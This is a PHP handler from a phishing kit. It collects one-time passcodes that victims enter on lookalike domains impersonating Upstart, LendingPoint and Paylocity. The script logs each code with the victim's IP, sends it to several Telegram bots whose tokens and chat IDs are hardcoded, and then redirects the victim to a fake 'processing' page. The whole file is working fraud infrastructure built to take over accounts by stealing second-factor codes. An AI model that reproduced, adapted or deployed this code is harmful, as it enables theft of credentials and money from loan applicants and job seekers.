<?php
// =========================================
// 🔐 UNIVERSAL CONFIRM OTP HANDLER (Multi-site)
// =========================================
include 'firewall.php';

// 🌐 Define your site-specific configurations here
$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7693363714:AAGyvBsKoR1ML6OwqcuBAW2aIEwiYzamw4M', 'chat_id' => '6108491247']

        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/processing.html'
    ],

    'thepaylocity.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7603786731:AAEPbaOXWK9DGtTTH3ZXMoTueem5OSY8uBA', 'chat_id' => '8084520583']
        ],
        'redirect' => 'https://thepaylocity.rf.gd/cache_site/careers/all-listings.job.34092/processing.html'
    ],
    
    'lendingpoint.ct.ws' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']

        ],
        'redirect' => 'https://lendingpoint.ct.ws/cache_site/lendingpoint/processing.html'
    ],

    'upstart-loans.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7611371083:AAE31mneMfDJYHNN_TidWJxfXV_2mV6kAVY', 'chat_id' => '7950407416']

        ],
        'redirect' => 'https://upstart-loans.42web.io/cache_site/processing.html'
    ],
    'upstart-loans.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7956417008:AAE_AajDMFr5uyaWrObRwXSRCsXXDeAlBuQ', 'chat_id' => '1566821522']

        ],
        'redirect' => 'https://upstart-loans.rf.gd/cache_site/processing.html'
    ],
    'upstartloans.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7829342178:AAG7bSD5-XY5pgg3XO0ynfVytz87oIwasZQ', 'chat_id' => '1566821522']

        ],
        'redirect' => 'https://upstartloans.rf.gd/cache_site/processing.html'
    ]





];


// 🧾 Logging utility
$log_file = 'submission_log.txt';
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// 📬 Telegram message sender
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// 🧠 Main logic
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $otp = htmlspecialchars($_POST['otpconfirm'] ?? '???');
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $domain = parse_url($referer, PHP_URL_HOST) ?? 'unknown';
    $timestamp = date("Y-m-d H:i:s");

    $msg = "✅ *OTP Confirmation from $domain*\n\n" .
           "🔒 *Code:* $otp\n" .
           "🌐 *IP:* $ip\n" .
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] Confirm OTP: $otp | IP: $ip", $log_file);

    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($msg, $config['bots']);
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        exit("Unauthorized");
    }
}
?>
